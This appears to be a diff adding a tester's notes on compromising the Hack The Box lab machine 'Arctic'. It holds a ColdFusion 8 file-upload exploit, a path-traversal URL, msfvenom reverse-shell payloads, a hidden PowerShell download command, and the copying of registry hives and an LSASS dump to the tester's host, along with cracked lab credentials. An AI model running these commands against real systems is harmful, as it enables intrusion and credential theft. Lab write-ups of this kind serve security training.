@@ -1,0 +1,436 @@
+2024-01-18 23:07:27 CST -- START TIME
+### Arctic ##
+--------------------------------------
+
+
+|================================================================
+- Name: ARCTIC
+- IP Address: 10.129.31.123
+- OS: Microsoft Windows Server 2008 R2 Standard/6.1.7600 N/A Build 7600/x64
+- Notes: 
+
+//CREDS:
+#http://10.129.31.123:8500/CFIDE/administrator/enter.cfm
+#ColdFusion8 - admin:happyday
+
+tolis : krjRUgtnI!
+Administrator : krtNFgyuIkeE*
+
+//Flags:
+#User:		c66f681bb1767c04a913e2f015ac5c58
+#System:	df88ded6a54b4ca132e7d3f0f04f6cd4
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2024-01-18 23:20:15 CST -- 
+// SCAN
+ip=10.129.35.186
+ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//135,8500,4915
+
+2024-01-18 23:20:27 CST -- 
+sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT      STATE SERVICE VERSION
+135/tcp   open  msrpc   Microsoft Windows RPC
+8500/tcp  open  http    JRun Web Server
+|_http-title: Index of /
+49154/tcp open  msrpc   Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: phone|general purpose|specialized
+Running (JUST GUESSING): Microsoft Windows Phone|8|7|2008|8.1|Vista (92%)
+OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
+Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+# UDP scan
+2024-01-18 23:24:10 CST -- 
+sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
+//NOthing
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// 8500/tcp  open  http    JRun Web Server
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2024-01-18 23:27:58 CST -- 
+whatweb -a1 http://10.129.35.186:8500
+
+http://10.129.35.186:8500 [200 OK] Country[RESERVED][ZZ], maybe Dell-OpenManage-Switch-Administrator, HTTPServer[JRun Web Server], IP[10.129.35.186], Index-Of, Title[Index of /]
+
+
+// nikto -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2024-01-18 23:34:03 CST -- 
+// scan website
+nikto -h http://10.129.35.186:8500 -o nikto_scan.txt
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//By clicking around:
+# http://10.129.35.186:8500/CFIDE/administrator/
+// Adobe ColdFusion 8 LoginPage
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Exploit Research (CVE-2010-2861)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+https://www.exploit-db.com/exploits/14641
+https://nvd.nist.gov/vuln/detail/CVE-2010-2861
+
+Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.
+
+searchsploit coldfusion
+
+//Interesting
+ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Adobe-ColdFusion-8-File-Upload-Exploit
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+wget https://raw.githubusercontent.com/nipunsomani/Adobe-ColdFusion-8-File-Upload-Exploit/main/exploit.py
+
+mv exploit.py CF8_fileUpload_exploit.py
+
+python2 CF8_fileUpload_exploit.py -h
+Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/coldfusion] </path/to/payload.jsp>
+Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp
+
+//CreatePayload (Java)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.47 LPORT=6969 -f raw -o exploit.jsp 
+
+//StartListener
+sudo rlwrap -cAr nc -lvnp 6969
+
+2024-01-25 17:17:46 CST -- 
+//RunExploit
+python2 CF8_fileUpload_exploit.py 10.129.31.123 8500 ./exploit.jsp
+
+Sending payload...
+Successfully uploaded payload!
+Find it at http://10.129.31.123:8500/userfiles/file/exploit.jsp
+
+2024-01-25 17:18:57 CST -- 
+//CB
+curl http://10.129.31.123:8500/userfiles/file/exploit.jsp
+
+//SUCCESS
+
+whoami
+arctic\tolis
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+type C:\Users\tolis\Desktop\user.txt
+//c66f681bb1767c04a913e2f015ac5c58
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+
+
+// PrivEsc(tolis)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+systeminfo
+
+Host Name:                 ARCTIC
+OS Name:                   Microsoft Windows Server 2008 R2 Standard 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                55041-507-9857321-84451
+Original Install Date:     22/3/2017, 11:09:45 ��
+System Boot Time:          27/1/2024, 9:07:40 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     6.143 MB
+Available Physical Memory: 5.054 MB
+Virtual Memory: Max Size:  12.285 MB
+Virtual Memory: Available: 11.217 MB
+Virtual Memory: In Use:    1.068 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.129.0.1
+                                 IP address(es)
+                                 [01]: 10.129.31.123
+
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name    SID                                          
+============ =============================================
+arctic\tolis S-1-5-21-2913191377-1678605233-910955532-1000
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288 Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+
+//SeImpersonatePrivilege is Enabled
+
+
+// privesc - MSF
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Create Payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.47 LPORT=443 -f exe -o msf_met.exe
+
+//Upload Payload
+sudo python -m http.server 80
+
+powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).DownloadFile('http://10.10.16.47:80/msf_met.exe', 'msf_met.exe')
+
+//Start MSF
+sudo msfconsole
+
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 443
+
+2024-01-25 18:35:55 CST -- 
+exploit -jz
+
+//CB
+.\msf_met.exe
+
+//SUCCESS!!
+
+sessions -i 1
+
+meterpreter > sysinfo
+Computer        : ARCTIC
+OS              : Windows Server 2008 R2 (6.1 Build 7600).
+Architecture    : x64
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 2
+Meterpreter     : x64/windows
+
+<BACKGROUND>
+
+search suggester
+
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+
+run
+
+//Found a usable potato
+use exploit/windows/local/ms16_075_reflection_juicy
+
+set SESSION 1
+set LHOST tun0
+set LPORT 443
+
+run
+
+meterpreter > sysinfo
+Computer        : ARCTIC
+OS              : Windows Server 2008 R2 (6.1 Build 7600).
+Architecture    : x64
+System Language : el_GR
+Domain          : HTB
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+//SUCCESS
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+ls 'C:\Users\Administrator\Desktop\'
+Listing: C:\Users\Administrator\Desktop\
+========================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2017-03-22 12:47:50 -0500  desktop.ini
+100444/r--r--r--  34    fil   2024-01-27 01:08:37 -0600  root.txt
+
+2024-01-25 18:50:13 CST -- 
+cat 'C:\Users\Administrator\Desktop\root.txt'
+//df88ded6a54b4ca132e7d3f0f04f6cd4
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+
+// [+] EXTRA
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// impacket-secretsdump --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# OFFLINE LOCAL - gather hashes from reg hives
+sudo impacket-smbserver -smb2support Public .
+
+meterpreter > shell
+
+reg save hklm\sam \\10.10.16.47\Public\sam.hiv
+reg save hklm\security \\10.10.16.47\Public\security.hiv
+reg save hklm\system \\10.10.16.47\Public\system.hiv
+
+
+impacket-secretsdump -sam ./sam.hiv -security ./security.hiv -system ./system.hiv LOCAL -outputfile hashdump.txt
+
+
+# Crack
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashdump.txt.sam
+
+//Nothing Cracked
+//Lets try pypykatz!!
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// pypykatz - Dump LSASS.exe -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// Get PID of lsass.exe
+tasklist /svc
+#492
+
+// Dump LSASS with procdump
+wget https://download.sysinternals.com/files/Procdump.zip
+unzip Procdump.zip
+
+// Upload procdump64.exe to target
+powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).DownloadFile('http://10.10.16.47:80/procdump64.exe', 'procdump64.exe') 
+
+
+// Execute procdump on target (Local)
+cmd /c "c:\procdump64.exe -accepteula -64 -ma lsass.exe C:\out.dmp"
+
+download out.dmp
+
+
+// Install pypykatz
+sudo apt install -y python3-pypykatz
+
+
+// Dump passwords & hashes with pypykatz
+pypykatz lsa minidump out.dmp > pass_dump.txt
+
+less pass_dump.txt
+
+#Passwords:
+//tolis : krjRUgtnI!
+//Administrator : krtNFgyuIkeE*
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// ColdFusion admin creds
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+searchsploit coldfusion
+searchsploit -x multiple/remote/14641.py
+
+//Adobe ColdFusion - Directory Traversal
+# http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+
+
+curl http://10.129.31.123:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+
+//INTERESTING!!!
+rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
+password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+encrypted=true
+
+
+https://crackstation.net/
+2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03	sha1	happyday
+
+//happyday
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2024-01-25 21:01:42 CST -- COMPLETE
+
